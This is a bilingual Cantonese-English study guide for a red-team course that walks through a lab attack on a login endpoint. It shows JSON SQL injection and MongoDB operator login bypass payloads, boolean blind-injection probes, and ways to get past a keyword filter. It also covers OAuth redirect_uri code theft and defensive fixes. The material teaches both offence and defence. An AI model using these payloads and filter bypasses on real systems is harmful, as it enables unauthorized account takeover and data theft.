# ART_T3 ART_T3_04：攻擊鏈②B 初始存取 — 注入與 SSO（Injection & SSO）雙語學習指南

> **原教材**：Advanced Red Team — Tutorial 3（PDF p.50–65、p.127–132、p.133–142）｜覆蓋 section：§4、§12、§13
> **本檔角色**：攻擊鏈②「Initial Access（初始存取）」嘅 **B 部** —— 注入（Injection）與 OAuth / SSO 設定錯誤。
> **閱讀方法**：繁中解說理解邏輯 → 英文 Blockquote 直接背誦 → 最後對照懶人包自測
> **配套檔（攻擊鏈②A）**：認證／自動化濫用（CAPTCHA、Email Bomb、Brute Force）➜ 見 `ART_T3_03_InitialAccess_A_CredentialAttacks_StudyGuide.md`
> **授權聲明**：本筆記係第三方英文教材嘅**重寫**，零原圖、零原文大段照抄；payload／指令屬技術內容，按原樣保留。

> ⚠️ 教材外補充：原文 attack-chain mapping 冇收錄 §13，此處按「OAuth 設定錯誤＝帳號接管」歸入初始存取。

---

## 📝 1. 初始存取（注入與 SSO）概要與實務情境

呢個階段係攻擊鏈 6 階段嘅**第二階段「Initial Access（初始存取）」**。初始存取嘅意思好簡單：你之前喺第一階段「公開偵察（Public Recon）」淨係喺外面睇、收集資料、**冇掂到目標系統**；由初始存取開始，你第一次**真正同目標伺服器互動、嘗試攞到第一個有效身分（foothold）**。本檔（②B）專攻三種「唔需要事先有帳號密碼都可以入到去」嘅入口：**§4 SQL Injection in a JSON Object（JSON 物件內嘅 SQL 注入）**、**§12 NoSQL Injection via JSON Wildcard（透過 JSON wildcard 嘅 NoSQL 注入）**、**§13 OAuth / SSO Misconfiguration（OAuth／SSO 設定錯誤）**。三個 section 嘅共同點係：**攻擊者手上永遠只有一樣嘢 —— 一個 HTTP request 嘅 body／param**，而伺服器把呢啲「使用者輸入」當成「指令」嚟執行，於是攻擊者就可以憑一句字串，繞過登入、攞到資料、甚至接管帳號。

本檔覆蓋嘅三個 section，喺 attack-chain 上嘅位置係：§4 同 §12 係**直接注入類**（攻擊者改寫後端 query 嘅邏輯），§13 係**協定設定錯誤類**（唔改寫 query，而係濫用 OAuth 流程本身嘅信任漏洞）。三條路都係通往同一目標：**攞到一個 admin／其他使用者嘅 session**。呢個係初始存取階段嘅核心價值 —— 攞到 foothold 之後，先可以走去下一階段（③權限提升、④憑證蒐集…）。原文把呢個階段嘅成果用一個 flag 標示：注入成功後你會見到 `FLAG{HIDDEN_ADMIN_ENDPOINT_ESCALATION_SUCCESS}`，證明「注入 → 管理員 session」呢條鏈行得通。

前置假設（要完成前面邊個階段先做得到）：**你必須先完成 §0 Setup**（靶場 VM 起好、Burp Suite 代理同 FoxyProxy 設定好、HTTPS／localhost 憑證 import 好）。因為本檔三個 section 全部要靠 **Burp Suite 攔截同改寫 request**（或者用 `curl`／Python 送出 POST），如果 §0 未做好，你就連 request 都睇唔到、改唔到。另外 §13 仲需要你識基本嘅 HTTP redirect（302）同 cookie 概念 —— 呢啲喺本檔第 3 節會用白話補底。**原文假設你已經識 Kali + Burp + HTTP 基礎**，但本檔會逐樣補，唔會當你識。

實務情境一（真實滲透測試會點用）：你受僱測試一個政府入口網站。你發現登入 API 收 `Content-Type: application/json`，於是你唔止試普通表單，仲試送 JSON body；一個單引號 `'` 就令回應由「登入失敗」變成「資料庫錯誤」。你順住呢條線用 blind injection 一位一位抽管理員密碼，最後用抽出嚟嘅密碼登入 admin 後台 —— 呢個就係 §4 嘅現實版。呢種「JSON body 都可以注入」係好多開發者嘅盲點，因為佢哋誤以為「唔係表單就安全」。

實務情境二（真實滲透測試會點用）：另一個前端係 SPA（Single Page App），佢用 MongoDB。你試 `{"username":"admin","password":{"$ne":""}}`，因為 `{"$ne":""}` 係一個物件而唔係字串，後端把它當成「密碼不等於空字串」嘅 query 邏輯，呢個對每一筆記錄都成立，於是你就咁登入咗 —— 呢個係 §12 嘅現實版。至於 §13，你發現「用政府 SSO 登入」嘅按鈕後面係一條 OAuth 流程，provider 冇檢查 `redirect_uri`，你就可以把 callback 指去自己嘅伺服器，偷到 authorization code，再喺受害人都唔知嘅情況下 force-login 成佢 —— 呢個係 §13 嘅現實版，亦係好多「Sign in with XXX」功能真實出現過嘅漏洞類型。

> **English Standard Definition:** Initial access is the attacker's first foothold into the target system. In web applications, injection flaws (SQL and NoSQL) and authentication-protocol misconfigurations (OAuth / SSO) are classic ways to obtain that foothold without prior credentials.

---

## 🎯 2. 學習目標

1. **解釋 JSON body 內嘅 SQL injection 點解一樣有效** — Explain why a single quote inside a JSON string value still breaks out of a concatenated SQL query
2. **分辨「傳輸格式」同「漏洞成因」** — Distinguish the transport format (JSON / XML / form) from the actual root cause of injection (untrusted input concatenated into a query)
3. **讀懂登入端點嘅 PHP 源碼，指出注入點** — Trace user input from a JSON body into a raw SQL query in `login.php`
4. **用 tautology（恆真式）payload 繞過登入** — Bypass login using a tautology payload such as `admin' OR '1'='1` delivered inside JSON
5. **理解 bad-list filter（黑名單過濾）同點樣繞過** — Understand how a primitive keyword bad-list works and how to adapt SQL syntax when a token is blocked
6. **實作 boolean-based blind SQL injection** — Perform boolean-based blind SQL injection by sending two requests that differ only in a true/false condition
7. **解釋為何 sqlmap 喺呢個端點失效，並自寫 Python 工具** — Explain why sqlmap performs poorly here and build a small purpose-built Python script that asks one true/false question per request
8. **解釋 NoSQL（MongoDB）operator injection** — Explain NoSQL injection via operators such as `$ne`、`$gt`、`$regex`、`$where` and wildcard `*` in a JSON filter
9. **講出 SQL 同 NoSQL 注入嘅共同根因** — State the single shared root cause of SQL and NoSQL injection
10. **解釋 OAuth 2.0 authorization code 流程同 redirect_uri 嘅角色** — Explain the OAuth 2.0 authorization code flow and the role of `redirect_uri`
11. **辨認 provider 缺失 redirect_uri allow-list 嘅弱點** — Identify a missing exact redirect-URI allow-list on an identity provider
12. **示範透過惡意 callback URL 偷取 authorization code 並 force-login** — Demonstrate account takeover by stealing a code through a malicious callback URL
13. **講出 OAuth 流程依賴嘅三大安全控制** — State the three controls the flow depends on：exact redirect-uri matching、per-session random `state`、short-lived single-use codes exchanged server-to-server
14. **寫出針對本檔三個漏洞嘅防守修正** — Write defender fixes for all three vulnerabilities (parameterized queries、type casting／key allow-listing、exact redirect-uri matching + state + PKCE)

---

## 🧩 3. 零經驗先修（Prerequisites, in plain words）

本節補嘅係「原文假設你已經識，但零實戰經驗嘅你未學過」嘅基礎。每一項都有一句定義、一個生活化比喻、同一句英文。

### 3.1 HTTP request 嘅 body 同 Content-Type

**一句定義**：一個 HTTP request 除咗「方法（GET／POST）」同「URL」之外，仲可以帶一個 **body（本文）**，body 嘅格式由 **`Content-Type`** header 話畀伺服器知（例如 `application/json`、`application/x-www-form-urlencoded`、`text/xml`）。
**生活化比喻**：好似寄包裹 —— URL 係收件地址，`Content-Type` 係包裹上面寫「內含玻璃製品／易碎」，body 就係包裹內容。收件人（伺服器）見到「玻璃製品」就會用對應方式拆箱；但**包裹內容本身有毒定冇毒，唔關個標籤事** —— 呢個就係 §4 嘅重點：JSON 標籤唔會令內容自動安全。
**English**：The request body carries data; `Content-Type` tells the server how to parse it, but it does not make the data safe.

### 3.2 JSON（JavaScript Object Notation）基本結構

**一句定義**：JSON 係一種用「鍵（key）＋值（value）」組成嘅純文字資料格式，物件用大括號 `{ }` 包住，鍵同字串值要用雙引號 `" "`，鍵值之間用冒號 `:`，多組用逗號 `,` 分隔。
**生活化比喻**：好似一張填好嘅表格 —— `"username": "admin"` 就係「姓名」欄填「admin」。麻煩在於：如果「姓名」欄你可以填一句**指令**，而系統傻傻咁照做，就出事。
**English**：JSON is a key-value text format; string values sit inside double quotes, and a value may also be a nested object or an array.

```json
{
  "username": "admin",
  "password": "Secret123!"
}
```

### 3.3 SQL 語句最基本結構（本檔核心先修）

**一句定義**：SQL 係同關聯式資料庫（例如 SQLite、MySQL）講嘢嘅語言。一條最基本嘅查詢（query）由幾部分組成：

```
SELECT <要邊啲欄> FROM <邊張表> WHERE <條件> LIMIT <只取幾多行>
```

- `SELECT *` = 「攞晒所有欄（`*` 代表全部欄）」
- `FROM users` = 「由 `users` 呢張表攞」
- `WHERE username = 'admin' AND password = 'x'` = 「只揀符合條件嘅行」
- `LIMIT 1` = 「最多淨係要 1 行」

**生活化比喻**：好似喺圖書館同管理員講「**幫我搵**（SELECT）**呢本書嘅所有資料**（`*`）**喺書架**（FROM）**入面，條件係書名等於《X》同作者等於 Y**（WHERE），**淨係要一本**（LIMIT 1）」。
**English**：A basic SQL query has the shape `SELECT columns FROM table WHERE condition LIMIT n`; `*` means all columns and `WHERE` carries the filter.

以下係本檔 lab 真實用嘅查詢（原文如此）：

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'Secret123!' LIMIT 1
```

**關鍵細節**：SQL 係用**單引號 `'`** 包住字串值。呢個唔係裝飾 —— 單引號係「字串開始／結束」嘅界線。正因為呢條界線存在，攻擊者先可以打一個 `'` 提早「收掣」，等後面嘅字串變成 SQL 語法。呢個就係 §4 成個漏洞嘅物理根源。

### 3.4 為何 `' OR 1=1--` 有效（tautology，恆真式）

**一句定義**：`' OR 1=1--` 係一個令 `WHERE` 條件**永遠成立**嘅 payload。拆開睇：

- `'` = 提早結束原本嘅字串（例如令 `username = '` 變成 `username = ''`，界線被打破）
- `OR 1=1` = 加上一個「1 等於 1」嘅條件，呢個條件永遠係真
- `--` = SQL 嘅「行註解」，即係由呢度開始後面全部當係註釋、唔執行 —— 用嚟吞掉原本程式碼後面嗰段（例如 `' AND password = 'x' LIMIT 1`）

**生活化比喻**：好似停車場閘機嘅規則係「入場證嘅姓名 ＝ 你報嘅名」。你報：「姓名 ＝ 任何人，**嘢或者** 1 等於 1（一定真）—— 後面嘅嘢唔使理」。閘機見到「1 等於 1」係真，就開閘。你根本冇有效入場證。
**English**：`' OR 1=1--` closes the string early, adds an always-true condition, and comments out the rest of the query so the filter always matches.

> ⚠️ 教材外補充：本 lab 因為 bad-list filter 封鎖咗 `--`（見 §4），所以原文用嘅係冇註解嘅版本 `admin' OR '1'='1`，靠「保持引號平衡」而唔係靠註解。你考場／實戰要兩種都識：`--` 版係最常見、最快嘅寫法；`' OR '1'='1` 版係當 `--` 被過濾時嘅變招。

### 3.5 SQL 註解、AND／OR 優先次序

**一句定義**：`--`（雙連號，後面通常要有一個空格）同 `/* ... */`（塊註解）係 SQL 嘅註解符號；`AND` 嘅運算優先次序高過 `OR`（即係 `AND` 會**先組埋**，好似數學嘅乘先於加）。
**生活化比喻**：`AND` 好似「同」、`OR` 好似「或」。講「A 或 B 且 C」時，人通常理解成「A 或 (B 且 C)」而唔係「(A 或 B) 且 C」—— SQL 都係前者。
**English**：`AND` binds tighter than `OR`; this precedence is exactly why a payload like `admin' OR '1'='1' AND password='x'` is grouped as `OR ('1'='1' AND password='x')`.

### 3.6 準備語句（Prepared Statements）同參數綁定

**一句定義**：prepared statement（準備語句）係一種「先把 SQL 樣板同使用者值分開、再交畀資料庫」嘅做法 —— SQL 樣板入面用佔位符（placeholder，例如 `?` 或 `:name`），使用者輸入係之後**單獨綁定（bind）**上去，資料庫保證呢啲值永遠只係「資料」而唔會變成「語法」。
**生活化比喻**：好似財務表格嘅空白欄 —— 表格（SQL 樣板）已經印死，你只可以喺指定欄位填字（綁定值），你冇能力改到表格上印好嘅文字（SQL 語法）。
**English**：Prepared statements with bound parameters keep user input as data, never code, because the query template and the values travel to the database separately.

```php
// 正確做法（PDO prepared statement，教材外補充示例）
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ? LIMIT 1");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();
```

> ⚠️ 教材外補充：呢段 PHP 係「正確做法」示範，唔係 attack payload。原文嘅漏洞版係直接把值串入字串（見 §4.1）。你記住一組對比就得：**「字串串接」＝ 有得注入**；**「佔位符 + 綁定」＝ 注入唔到**。

### 3.7 NoSQL（MongoDB）同 document／operator 概念

**一句定義**：NoSQL 資料庫（例如 MongoDB）唔用「表 + 行」，而係用 **document（文件）** —— 即係好似 JSON 咁嘅物件，存喺 **collection（集合）** 入面。查詢唔再係 SQL 文字，而係一個**查詢物件**，可以帶 **operator（運算子）**：`$ne`（not equal，唔等於）、`$gt`（greater than，大於）、`$regex`（正則式匹配）、`$where`（用 JS 條件）。
**生活化比喻**：SQL 好似「填格仔嘅表格」，NoSQL 好似「一疊自由格式嘅卡片」。查詢時你唔係寫 SQL，而係交一張「篩選卡」畀系統 —— 問題係如果你把「使用者講嘅字」直接當成「篩選卡上嘅 operator」，你就變相寫咗查詢邏輯。
**English**：NoSQL stores schema-less JSON-like documents; queries are operator-based objects such as `{$ne: ...}`, and injection happens when user input lands in that object as query logic.

```plaintext
// MongoDB shell 查詢樣式（原文如此）
db.users.findOne({ username: "admin", password: "123" })
```

### 3.8 Driver／ORM 同「Type Casting」

**一句定義**：driver（驅動程式）係應用程式語言同資料庫之間嘅翻譯層；ORM（Object-Relational Mapping）係更高階嘅「用物件操作資料庫」工具。**Type casting（型別強制轉換）** 係把使用者輸入強制變成預期型別（例如「一定要係字串」），咁 `{"$ne":""}` 呢個物件就會被拒。
**生活化比喻**：好似入境申報表有一欄「只可填數字」；如果有人填咗一句指令，櫃檯（type casting）就會話「呢欄唔接受，請填數字」，指令冇機會被執行。
**English**：Type casting and key allow-listing force input into the expected shape, so a value that should be a string can never become a query operator.

### 3.9 OAuth 2.0 authorization code flow（授權碼流程）

**一句定義**：OAuth 2.0 係一套「**委派授權（delegated authorization）**」框架（⚠️ 教材外補充：OAuth 本身唔做使用者認證，認證層係喺佢之上嘅 OpenID Connect） —— 應用程式（叫做 **relying party／client**）本身唔保管你密碼，而係把瀏覽器送去 **identity provider（身分提供者，IdP）** 登入，provider 驗證完之後，把瀏覽器**轉返**應用程式，並喺 URL 帶上一個短命嘅 **authorization code（授權碼）**，應用程式再喺後端（server-to-server）用呢個 code 向 provider 嘅 **token endpoint** 換取身分資料。
**生活化比喻**：好似去酒店代客泊車 —— 你（使用者）唔使交出車匙原配（密碼），你只係喺停車場（provider）登記，然後攞一張**一次性取車票（code）**，酒店職員（relying party）憑票去換車。
**English**：In the OAuth authorization code flow the relying party redirects the browser to the provider, receives a short-lived code on a callback URL, and exchanges it server-to-server for identity information.

名詞速拆：
- **relying party / client** ＝ 想用 provider 登入嘅應用程式（本 lab 係政府入口網站）
- **identity provider（IdP）** ＝ 真正驗證身分嘅外部系統（本 lab 模擬版本係 `oauth_provider.php`）
- **redirect_uri / callback URL** ＝ provider 認證完之後，把瀏覽器送返去嘅位址
- **authorization code** ＝ 一次性、短命嘅兌換券
- **state** ＝ relying party 自己加嘅隨機值，用嚟做 CSRF 防禦（見 3.10）
- **token endpoint** ＝ provider 用嚟「code 換 token」嘅後端端點

### 3.10 redirect_uri、state、PKCE

**一句定義**：
- **redirect_uri allow-list** ＝ provider 預先登記「准許嘅 callback 位址清單」，只准把 code 送去清單上、**完全一致**嘅位址。
- **state** ＝ relying party 每次登入產生一個**每 session 隨機**嘅值，callback 返嚟時要對得上；對唔上就拒收（呢個係 OAuth 流程嘅 CSRF 防禦）。
- **PKCE**（Proof Key for Code Exchange，讀 "pixy"）＝ 額外一層「code 換 token 時要出示一個只有原 client 知嘅秘密」，專門保護 public client（例如 SPA、手機 app）。
**生活化比喻**：redirect_uri allow-list 好似「**只准把包裹送去我登記咗嘅倉庫地址**」；state 好似「包裹上要有一個每次唔同嘅封條號碼，你對唔上就唔好簽收」；PKCE 好似「除咗取車票，仲要出示你自己先有嘅暗號」。
**English**：The redirect_uri allow-list guarantees codes only reach registered URIs; `state` is the flow's CSRF defense; PKCE binds the code exchange to the original client.

### 3.11 HTTP 302 redirect、Set-Cookie、session cookie

**一句定義**：**HTTP 302** 係「暫時重新導向」狀態碼，回應會帶一個 **`Location`** header，話畀瀏覽器「下一站去邊」。**`Set-Cookie`** 係伺服器叫瀏覽器「記住呢個 session cookie」嘅 header；之後你嘅 request 就會自動帶返呢個 cookie（代表你已登入）。
**生活化比喻**：302 好似「此處裝修，請去 B 舖」嘅指示牌；`Set-Cookie` 好似發一張「入場手帶」，之後你出入都用呢條手帶證明身分。
**English**：A 302 response carries a `Location` header telling the browser where to go next; `Set-Cookie` issues the session cookie the browser sends back on later requests.

### 3.12 HTTP 狀態碼 200 vs 401（本檔嘅「真／假」訊號）

**一句定義**：**200 OK** ＝ 成功；**401 Unauthorized** ＝ 未通過認證。本檔 §4 嘅 blind injection 就係靠「伺服器答 200 定 401」嚟逐位猜密碼 —— **200 = 你嘅條件為真（猜中）**，**401 = 為假（猜錯）**。
**生活化比喻**：好似玩「大聲／細聲」猜謎遊戲：你問一句「係唔係『a』？」，對方淨係答「係」或「唔係」，你就逐個字母問，最終拼出答案。
**English**：A 200 response is the "true" answer and a 401 is the "false" answer; blind injection recovers data one character at a time from this single bit of feedback.

---

## 📖 4. 逐節深度知識點重寫

### 4.1 §4 SQL Injection in a JSON Object（原文 p.50–65）

原文嘅學習目標（原樣意思）：trace user input from a JSON body into a raw SQL query, and bypass login using a SQL injection payload delivered inside JSON。

#### 4.1.1 What is it and why does it work?（原文 p.50–51）

**繁中解說**：SQL injection（SQL 注入）發生喺「應用程式**把未受信任嘅輸入直接串接（concatenate）入 SQL 字串**」嗰一刻。當你嘅輸入被當成字串一部份黐埋入 query，資料庫嘅 **parser（解析器）就會把你輸入嘅一部分解讀成 SQL 語法**，而唔係純資料，於是攻擊者就可以改寫 query 嘅邏輯。關鍵詞係「**SQL does not cleanly separate code from data**」—— SQL 本身**唔會乾淨咁分開「指令」同「資料」**，所以一黐埋就出事。

> **English Standard Definition:** SQL injection occurs when an application builds a database query by concatenating untrusted input directly into the SQL string. It is classified as CWE-89: Improper Neutralization of Special Elements used in an SQL Command.

**本 lab 嘅特殊位（原文 p.51）**：登入端點喺 **`Content-Type: application/json`** 時會收 JSON。伺服器會讀原始 body、decode JSON、再把值黐入一條 raw SQL query。原文特別點出一句重點 —— 因為格式係 JSON 而唔係傳統 form，開發者**有時會誤以為咁樣安全啲**，但事實係：**transport format is irrelevant（傳輸格式無關痛癢）**。JSON、XML、form data、headers、cookies，只要個值係被串接入 SQL，全部一樣可以注入。

> **English Standard Definition:** Because the input format is JSON rather than a traditional form, developers sometimes assume it is safer, but the transport format is irrelevant: JSON, XML, form data, headers, and cookies are all equally injectable if the value is concatenated into SQL.

**OWASP／CWE 對應（原文 p.51）**：
- **CWE-89**：Improper Neutralization of Special Elements used in an SQL Command
- **OWASP mapping**：**A03:2021 — Injection**

**In the wild（原文 p.51）**：2021 年嘅 **Accellion FTA** 漏洞事件，就係把 SQL injection 同 OS command execution 結合，用來部署 web shell 同從多間機構外洩資料。另引 OWASP 2021 數據：injection flaws 喺 **274,228** 個受測應用、橫跨 **32,078** 個 CVE 中被發現，最高 incidence rate 達 **19%**。原文形容呢個漏洞「easy to detect, easy to exploit, and affects any data-rich application」。攻擊者用 SQL injection 嚟：**繞過認證、列舉 schema、外洩資料表、修改資料**，某啲設定下仲可以**執行作業系統指令**。

> ⚠️ 教材外補充（數字記憶）：呢三個數字要記 —— **274,228 個應用 / 32,078 個 CVE / 最高 19% incidence**，同 **CWE-89**、**A03:2021** 一齊係最常考嘅配對。

#### 4.1.2 How to find it（原文 p.51–52）

原文畀嘅發現方法（逐條重寫）：
1. **集中火力喺常見目標**：login forms（登入表單）、search boxes（搜尋框）、filters（篩選器）、sort parameters（排序參數）—— 呢啲係 classic SQLi targets。
2. **檢查應用程式會唔會收其他 content type**，例如 `application/json`；**被串接入 SQL 嘅 JSON 值，同表單欄位一樣可注入**。
3. **打一個單引號 `'` 去 probe（探測）** username，然後睇會唔會有**資料庫錯誤**或者**回應明顯唔同**。單引號探測引起錯誤或回應差異，就係注入嘅訊號。
4. **用 tautology payload 確認**，例如 `' OR '1'='1`，睇回應有冇改變。一個會令回應改變嘅恆真式 payload 就確認咗注入。

> **English Standard Definition:** A single-quote probe that triggers database errors or response differences reveals injection; a tautology payload (`' OR '1'='1'`) that changes the response confirms the injection.

#### 4.1.3 Try it yourself：理解 JSON 結構同注入點（原文 p.52–57）

> **圖示描述**：本節「Try it yourself」開頭嘅畫面，展示 lab 登入端點嘅起始狀態（原教材此圖未提供 caption；本筆記只按上下文標示其位置，不作內容臆測）（對應原教材 Screenshot 36，本筆記不轉載圖片）。

**步驟 1 — 理解伺服器期望嘅 JSON 結構（原文 p.53）**：lab 嘅 `login.php` 有一條 JSON code path —— 當 request 用 `Content-Type: application/json`，伺服器會讀原始 body 再 decode（原文如此）：

```php
$body = file_get_contents('php://input');
$data = json_decode($body, true);
$username = $data['username'];
$password = $data['password'];
```

原文講你可以喺瀏覽器直接讀呢個檔：`http://localhost:8080/login.php`（或者用 `view-source:http://localhost:8080/login.php` 睇未 render 嘅原始碼）。

> **圖示描述**：瀏覽器顯示 `http://localhost:8080/login.php` 嘅原始碼，可見 `file_get_contents('php://input')`、`json_decode($body, true)`，以及由 `$data['username']`／`$data['password']` 取值嘅 JSON 處理路徑（對應原教材 Screenshot 105，本筆記不轉載圖片）。

此格式嘅登入 body 長咁樣（原文如此）：

```json
{
  "username": "admin",
  "password": "Secret123!"
}
```

**步驟 2 — 睇清楚啲值點樣變成 SQL query 一部份（原文 p.54）**：伺服器把 decode 出嚟嘅值直接串接（concatenate）入字串。原文特別注明 **real code 會先過 bad-list filter（見後面 blind injection 部分），以下係簡化版**：

```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password' LIMIT 1";
```

同一個 `login.php` 可以喺 `http://localhost:8080/login.php` 睇到（或者 `view-source:` 版本）。

> **圖示描述**：瀏覽器顯示 `login.php` 原始碼，可見 `$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password' LIMIT 1";` 呢行字串串接（對應原教材 Screenshot 106，本筆記不轉載圖片）。

用上面「乾淨」嘅 JSON，資料庫實際見到嘅係（原文如此）：

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'Secret123!' LIMIT 1
```

**步驟 3 — 砌一個惡意 JSON payload 改寫 SQL 邏輯（原文 p.55）**：唔好送普通 username，而係送一個字串，**提早收掉原本嘅引號、再加一個對 admin 行永遠為真嘅條件**（原文如此）：

```json
{
  "username": "admin' OR '1'='1",
  "password": "x"
}
```

伺服器把呢個值黐入 SQL 字串之後，query 變成（原文如此）：

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'x' LIMIT 1
```

原文嘅關鍵推理：`OR '1'='1' AND password = 'x'` 因為 **AND 綁得比 OR 緊**，會被解讀成 `OR ('1'='1' AND password = 'x')`。因為密碼錯，個 group 咗嘅 AND 係 false；但 **`username = 'admin'` 本身仍然為真**，所以資料庫照樣回傳 admin 嗰一行。

**步驟 4 — 喺 Burp Suite 送出 payload 並確認注入（原文 p.56）**：Burp Repeater 逐步如下：
1. 喺 Proxy → HTTP history 右鍵捕捉到嘅 `POST /login.php` request，揀 **Send to Repeater**。
2. 開 Repeater tab、選你嘅 request，確保 method 係 **POST**。
3. 把原有 body 換成 JSON payload：`{"username":"admin' OR '1'='1'","password":"x"}`。
4. 加／更新 header：`Content-Type: application/json`。
5. 撳 **Send**。
6. 回應會包含 `"status":"ok"` 同一個 `Set-Cookie` header。

**步驟 5 — 觀察 JSON 回應確認 admin 登入（原文 p.56）**：回應 body 長咁樣 —— `Set-Cookie` header 帶住 admin session，你下一步會重用（原文如此）：

```json
{"status":"ok","message":"Logged in as admin","role":"admin"}
```

**步驟 6 — 確認你已用 admin 身分登入（原文 p.56–57）**：因為登入係喺 Repeater 內部發生，你嘅瀏覽器本身冇 admin cookie，所以刷新個 tab 唔會有變化。兩條路任揀其一：
- **喺瀏覽器（Screenshot 90）**：由回應複製 `Set-Cookie` 值，喺 Firefox 嘅 cookie storage（DevTools → Storage → Cookies）為 `localhost:8080` 加入呢個 cookie，然後去 `http://localhost:8080/admin.php`。
- **喺 Repeater（Screenshot 91）**：建立一個 `GET /admin.php` request，把複製咗嘅 `Cookie` header 貼入去，然後送出。

> **圖示描述**：Firefox DevTools → Storage → Cookies 面板，把回應嘅 `Set-Cookie` 值為 `localhost:8080` 加入成一個 cookie（對應原教材 Screenshot 90，本筆記不轉載圖片）。

> **圖示描述**：Burp Repeater 內建立一個 `GET /admin.php` request，並貼上由登入回應複製嘅 `Cookie` header（對應原教材 Screenshot 91，本筆記不轉載圖片）。

**步驟 7 — admin dashboard 出現（原文 p.57）**：dashboard 載入，以 administrator `admin` 身分迎接你，並有綠色 `FLAG{HIDDEN_ADMIN_ENDPOINT_ESCALATION_SUCCESS}` banner —— 證明注入為你攞到一個管理員 session。

> **圖示描述**：admin dashboard 頁面，以 administrator `admin` 身分登入，並顯示綠色 `FLAG{HIDDEN_ADMIN_ENDPOINT_ESCALATION_SUCCESS}` banner（對應原教材 Screenshot 37，本筆記不轉載圖片）。

**Conclusion（原文 p.58）**：伺服器 decode JSON body 並把值直接串接入 raw SQL 字串；payload 收掉引號、加一個 OR 條件，令 query 無視密碼都回傳 admin 嗰行。

> **English Standard Definition:** The server decodes the JSON body and concatenates the values directly into a raw SQL string. The payload closes the quote and adds an OR condition that makes the query return the admin row regardless of the password.

#### 4.1.4 Try it yourself：透過 bad-list filter 做 blind SQL injection（原文 p.58–64）

同一個 `/login.php` 端點有**一個原始（primitive）嘅 bad-list filter**，會移除 `UNION`、stacked-query 標記、註解序列等關鍵詞。呢個 filter 亦**抑制 SQL 錯誤**，所以你唔可以再靠錯誤訊息。取而代之，你要喺普通登入端點做 **boolean-based blind SQL injection**：送兩個只差一個「真／假」條件嘅 request，再比較登入回應。

**Bypassing filters 嘅心法（原文 p.58 起）**：lab 個 bad list 係（原文如此）：

```php
$bad_list = ['UNION', 'INSERT', 'DELETE', 'UPDATE', 'DROP', '--', ';', '/*']
```

原文注明：呢個 list 係用 **case-insensitive `str_ireplace()`** 移除。因為 `str_ireplace()` 唔分大小寫，所以**單純改大小寫（例如 `uNiOn`）係 bypass 唔到** —— 你必須**改變 SQL 語法本身**。

以下係原文嘅 bad-list 對照表（逐格重寫）：

| Filtered／blocked word | Why it is blocked | Bypass using changed SQL syntax |
|---|---|---|
| `UNION` | 把另一張表嘅行合併入結果集，可以一 query 直接外洩任意表。 | 大小寫變化失敗（`str_ireplace` 唔分大小寫），`UNI/**/ON` 亦失敗（`/*` 同樣被封）。可把關鍵詞夾喺一個會被 filter 剝走嘅 token 兩邊（`UNIUNIONON` 喺 filter 移除內層 `UNION` 後會變成 `UNION`），或者索性唔用 UNION，改用 boolean-based blind extraction（`AND substr(...)`）漏資料。 |
| `INSERT` | 可以加新行（開帳號、植入資料）。 | 讀取資料偷竊唔需要佢：改用 `WHERE` 入面嘅 `(SELECT ...)` 子查詢去讀值。 |
| `UPDATE`／`DELETE`／`DROP` | 如果可以執行第二條 statement，就可以修改或破壞資料。 | 呢度 SQLite 每個 query 只行一條 statement，所以把邏輯摺入唯讀子查詢；外洩資料根本唔需要呢啲關鍵詞。 |
| `;`（semicolon） | 標示 stacked（第二條）query 嘅開始，例如 `; DROP TABLE users`。 | 把第二條 statement 換成子查詢，例如 `AND (SELECT password FROM users WHERE username='admin')=...`，用單一 statement 完成工作。 |
| `--`（double dash） | 行註解，用嚟吞掉應用程式尾隨嘅引號，例如 `admin' OR '1'='1'--`。 | 唔好註解走 query 其餘部分 —— 反而保持字串語法平衡：payload 以 `OR '1'='1` 結尾，等應用程式自己嗰個收尾引號補齊最後個字串。 |
| `/*`（block comment） | 內聯註解，用嚟隱藏關鍵詞或空格，例如 `UNI/**/ON` 或 `SELECT/**/password`。 | 改語法而唔係藏語法：用括號 `( ... )` 控制運算次序，或者喺 transport 容許時用其他空白（例如 tab `%09`）代替空格。 |
| `SELECT`（對照用：喺本 lab 冇被封） | 唔喺 bad list 入面 —— 呢個原始 filter 淨係封明顯嘅破壞／union 關鍵詞。 | 照用：`SELECT` 喺子查詢內仍然可用，亦正因為咁 boolean-based blind extraction 喺度仲行得通。 |

**發現步驟（原文 p.59）**：
1. **確認咩被封**：送含 `UNION`、`SELECT`、`--`、`/*`、`;` 嘅 probe。如果回應同「登入失敗」一模一樣，個 filter 好可能移除或拒絕咗嗰啲 token。
2. **搵仍然可用嘅嘢**：即使係嚴格 filter，都成日漏咗 blind injection 嘅基本積木 —— `AND`、子查詢、同字串函數例如 `substr()`。
3. **保持語法有效**：因為應用程式把 username 包喺單引號內，你要**留住 payload 最後個引號唔封**，等應用程式自己嗰個收尾引號完成最後字串。

**確認 boolean 訊號同 filter 封咩（原文 p.60）**：用 `Content-Type: application/json` probe 同一個 `POST /login.php`。端點只會答 `{"status":"ok"}`（有效登入）或 `{"status":"error","message":"Invalid credentials"}`（登入失敗）。喺 Burp Repeater 送以下兩個 payload（原文如此）：

```json
{"username":"admin' AND '1'='1' OR '1'='1","password":"x"}
{"username":"admin' AND '1'='2' OR '1'='1","password":"x"}
```

原文結果：**第一個（真條件）payload 回 HTTP 200 + `{"status":"ok",...}`**；**第二個（假條件）payload 回 HTTP 401 + `{"status":"error","message":"Invalid credentials"}`**。個 `OR '1'='1` 尾巴係為咗保持 query 語法有效 —— 應用程式自己嗰個收尾引號會完成最後字串 —— 所以兩個 request 之間**唯一差別就係個真／假條件**，而回應就揭示答案。同時注意 filter 封咗 `UNION`、`;`、`--`、`/*`（見上面 bad-list 表），所以 `UNION SELECT` 同 stacked-query 攻擊喺度行唔通；但 `AND`、`SELECT`、子查詢倖存，正係 boolean-based blind extraction 需要嘅嘢。

> **圖示描述**：Burp Repeater 顯示兩個 boolean payload 嘅請求與回應對照 —— 真條件回 HTTP 200 `{"status":"ok",...}`、假條件回 HTTP 401 `{"status":"error","message":"Invalid credentials"}`（對應原教材 Screenshot 92，本筆記不轉載圖片）。

